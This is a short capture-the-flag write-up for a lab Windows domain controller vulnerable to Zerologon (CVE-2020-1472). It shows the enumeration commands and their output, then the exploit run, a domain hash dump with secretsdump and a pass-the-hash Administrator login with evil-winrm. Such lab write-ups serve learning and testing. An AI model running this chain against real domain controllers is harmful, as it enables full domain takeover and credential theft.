
## Enumeration

#### nmap

```bash
nmap -sC -sV -Pn <ip>
```

```
...
445/tcp open               Windows Server 2016 Standard 14393 microsoft-ds
Service Info: Host: DC-ZEROLOGON; OS: Windows; CPE: cpe:/o:microsoft:windows
...
```

#### NetExec

```bash
nxc smb ctf17.root-me.org -u '' -p '' -M zerologon
```

```
SMB         163.172.195.80  445    DC-ZEROLOGON     [*] Windows Server 2016 Standard 14393 x64 (name:DC-ZEROLOGON) (domain:DCNAME.local) (signing:True) (SMBv1:True)
SMB         163.172.195.80  445    DC-ZEROLOGON     [+] DCNAME.local\: 
ZEROLOGO... 163.172.195.80  445    DC-ZEROLOGON     VULNERABLE
ZEROLOGO... 163.172.195.80  445    DC-ZEROLOGON     Next step: https://github.com/dirkjanm/CVE-2020-1472

```

## Exploit

Download the exploit : https://github.com/dirkjanm/CVE-2020-1472

Run the exploit : 
```bash
python3 cve-2020-1472-exploit.py DC-ZEROLOGON <IP>
```


Use secretsdump to dump hashes :
```bash
impacket-secretsdump -just-dc -no-pass DC-ZEROLOGON\$@<IP>
```

Use evil-winrm to connect as Administrator : 

```bash
evil-winrm -u Administrator -H <ntlm hash> -i <IP>
```


